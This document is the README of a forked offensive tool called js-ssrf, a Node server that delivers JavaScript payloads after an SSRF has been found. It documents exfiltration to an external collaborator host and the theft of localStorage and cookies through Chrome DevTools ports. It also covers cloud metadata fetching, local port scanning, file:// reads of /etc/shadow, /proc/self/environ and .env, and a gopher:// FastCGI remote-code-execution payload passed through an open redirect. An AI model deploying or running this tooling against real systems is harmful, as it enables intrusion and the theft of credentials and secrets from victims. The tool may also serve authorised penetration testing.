# js-ssrf

Server prepared for SSRF post exploitation, javascript exploits, tools and open redirect.

*AFTER SSRF*

## Fork Changes

This fork includes several improvements and new features:

### New Features
- **Chrome DevTools Protocol (CDP) exploitation** - Scans multiple debug ports (9222, 9229, 9481, 5858, 3389) and extracts data via WebSocket
- **File protocol attacks** - Read local files and list directories via `file://` protocol (for server-side headless browsers)
- **Sandbox detection** - Detects if browser is running with `--no-sandbox` flag
- **No-JS tracking** - Uses `<img>` tags to track requests even when JavaScript is disabled
- **Dynamic payload generation** - Select which exploits to run via URL parameter `?f=`
- **Auto-decoded logs** - Base64 logs are automatically decoded on the server

### CLI Improvements
- `-c, --collaborator <url>` - Set external collaborator server for exfiltration
- `-p, --port <port>` - Set server port (default: 2222)
- `-h, --help` - Show help message

### Code Fixes
- Fixed syntax error in `localStorageLeak()`
- Updated deprecated `req.connection.remoteAddress` to `req.socket.remoteAddress`
- Converted synchronous XHR to async
- Fixed uninitialized variables and missing `var` declarations
- Fixed typos (`communPorts` -> `commonPorts`, `matadataPaths` -> `metadataPaths`)
- Protocol-aware requests (http/https based on page protocol)

---

## Installation

```bash
git clone https://github.com/YOUR_USERNAME/js-ssrf.git
cd js-ssrf/
npm install
```

## How To Run

```bash
# Basic usage (logs to local /log endpoint)
node server.js

# With external collaborator
node server.js -c your-collaborator.com

# Custom port
node server.js -p 8080 -c your-collaborator.com

# Show help
node server.js -h
```

## Payload URL Parameters

Select which exploits to run via the `?f=` parameter:

```
https://your-server/?f=all                           # Run all exploits (default)
https://your-server/?f=localStorage,chromeHeadless   # Run specific exploits
https://your-server/?f=fileRead,fileList             # File protocol attacks only
https://your-server/?f=cdpExtract&wsUrl=ws://...     # CDP WebSocket extraction
```

### Available Functions

| Function | Description |
|----------|-------------|
| `localStorage` | Steal browser localStorage |
| `chromeHeadless` | Scan for Chrome DevTools Protocol endpoints |
| `cdpExtract` | Extract cookies/data via CDP WebSocket (requires `&wsUrl=`) |
| `browserInfo` | Get browser information and plugins |
| `cloudMetadata` | Fetch cloud provider metadata (AWS, GCP, Alibaba, DigitalOcean) |
| `portScanner` | Scan local ports |
| `fileRead` | Read local files via `file://` protocol |
| `fileList` | List directories via `file://` protocol |
| `all` | Run all functions (except cdpExtract) |

## Available Exploits And Tools

- Browser Storage Leak
- Chrome DevTools Protocol Exploitation (CDP)
- File Protocol Attacks (file://)
- Sandbox Detection
- Leak Browser Information (Plugins, versions, etc...)
- Cloud Metadata Information
- Local Port Scanner
- Open Redirect
- No-JS Tracking

## How To Use

### Open Redirect

Any request that starts with **/openredirect** will redirect to the passed URL in the **url** parameter with the given scheme and parameters. You can abuse of the **gopher://** scheme to get remote code execution.

**Redirect to Google Example:**
```
http://127.0.0.1:2222/openredirect?url=https://www.google.com
```

**Exploit Fastcgi RCE example:**
```
http://127.0.0.1:2222/openredirect?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20...
```

### Server Log

The server automatically decodes base64 log messages:

```
[LOG] Triggered in https://victim.com/
[LOG] LocalStorageLeak: token=abc123&session=xyz
[LOG] CDP WebSocket URL found: ws://127.0.0.1:9222/devtools/browser/...
```

### No-JS Tracking

Even if JavaScript is disabled, the server tracks requests via `<img>` tags:

```
[PING] type=img ip=192.168.1.100 ua=Mozilla/5.0 ...
[PING] type=noscript ip=192.168.1.100 ua=...    # JS was disabled
```

### Cloud Metadata Servers

Pre-configured metadata paths for:

| Provider | Server |
|----------|--------|
| Google Cloud | metadata.google.internal |
| Alibaba Cloud | 100.100.100.200 |
| Amazon AWS | 169.254.169.254 |
| Digital Ocean | 169.254.169.254 |

### CDP Debug Ports Scanned

| Port | Service |
|------|---------|
| 9222 | Chrome DevTools default |
| 9229 | Node.js inspector |
| 9481 | Alternative CDP |
| 5858 | Legacy Node debug |
| 3389 | Alternative debug |

### Sensitive Files Read (file:// attacks)

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/app/.env
/.env
/var/log/auth.log
```
